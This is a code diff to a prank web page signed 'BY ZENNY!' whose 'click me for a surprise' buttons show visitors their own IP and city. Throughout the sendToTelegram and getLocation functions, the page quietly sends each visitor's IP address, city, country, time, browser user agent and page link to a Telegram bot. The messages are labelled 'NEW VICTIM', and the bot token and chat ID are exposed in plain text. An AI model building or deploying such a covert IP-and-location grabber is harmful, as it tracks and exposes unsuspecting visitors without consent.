@@ -122,11 +122,11 @@
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
       </div>
 
-      <!-- STEP 2: LOCATION -->
+      <!-- STEP 2: CITY + COUNTRY -->
       <div id="result-location" class="result hidden">
         <div>Here’s where you are:</div>
-        <div id="country" style="color:#ff6666; font-size:1.6rem;">...</div>
-        <div id="city" style="color:#ff9999; font-size:1.6rem;">...</div>
+        <div id="city" style="color:#ff6666; font-size:1.7rem;">...</div>
+        <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
       </div>
 
       <div class="by">BY ZENNY!</div>
@@ -149,17 +149,17 @@
 
     // === TELEGRAM BOT ===
     const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
-    const CHAT_ID = '6726658638'; // ← YOUR CHAT ID
+    const CHAT_ID = '6726658638';
 
     let userIP = "";
 
     // === SEND TO TELEGRAM ===
-    function sendToTelegram(ip, country = "", city = "") {
+    function sendToTelegram(ip, city = "", country = "") {
       const time = new Date().toLocaleString();
       const ua = navigator.userAgent.substring(0, 100);
       let message = `NEW VICTIM\n\nIP: ${ip}`;
+      if (city) message += `\nCity: ${city}`;
       if (country) message += `\nCountry: ${country}`;
-      if (city) message += `\nCity/Province: ${city}`;
       message += `\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
         .catch(() => {});
@@ -172,26 +172,26 @@
         .then(data => {
           userIP = data.ip;
           document.getElementById('ip').innerHTML = userIP;
-          sendToTelegram(userIP); // Send IP only
+          sendToTelegram(userIP);
         })
         .catch(() => {
           document.getElementById('ip').innerHTML = "BLOCKED";
         });
     }
 
-    // === STEP 2: GET LOCATION FROM IP ===
+    // === STEP 2: GET CITY + COUNTRY FROM IP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
         .then(data => {
-          const country = data.country_name || "Unknown";
-          const city = data.city || data.region || "Unknown";
-          document.getElementById('country').innerHTML = `Country: ${country}`;
-          document.getElementById('city').innerHTML = `City/Province: ${city}`;
-          sendToTelegram(userIP, country, city); // Send full info
+          const city = data.city || "Unknown City";
+          const country = data.country_name || "Unknown Country";
+          document.getElementById('city').innerHTML = `${city}`;
+          document.getElementById('country').innerHTML = `${country}`;
+          sendToTelegram(userIP, city, country);
         })
         .catch(() => {
-          document.getElementById('country').innerHTML = "Location: Blocked";
+          document.getElementById('city').innerHTML = "Location Blocked";
         });
     }
 
@@ -205,7 +205,7 @@
       getIP();
     }
 
-    // === REVEAL LOCATION ===
+    // === REVEAL CITY + COUNTRY ===
     function revealLocation() {
       document.querySelector('#result-ip .btn').classList.add('hidden');
       const result = document.getElementById('result-location');
